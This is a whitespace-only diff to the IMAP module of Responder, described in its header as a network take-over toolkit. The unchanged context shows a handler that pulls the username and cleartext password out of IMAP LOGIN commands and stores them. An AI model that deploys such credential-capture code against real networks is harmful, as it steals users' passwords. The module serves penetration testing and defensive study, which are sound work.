@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by the watchers.
 # email: providence@tao.oga
 # This program is free software: you can redistribute it and/or modify
@@ -36,11 +36,11 @@ class IMAP(BaseRequestHandler):
 			if data[5:10] == b'LOGIN':
 				Credentials = data[10:].strip().decode("latin-1").split('"')
 				SaveToDb({
-					'module': 'IMAP', 
-					'type': 'Cleartext', 
-					'client': self.client_address[0], 
-					'user': Credentials[1], 
-					'cleartext': Credentials[3], 
+					'module': 'IMAP',
+					'type': 'Cleartext',
+					'client': self.client_address[0],
+					'user': Credentials[1],
+					'cleartext': Credentials[3],
 					'fullhash': Credentials[1]+":"+Credentials[3],
 				})
 
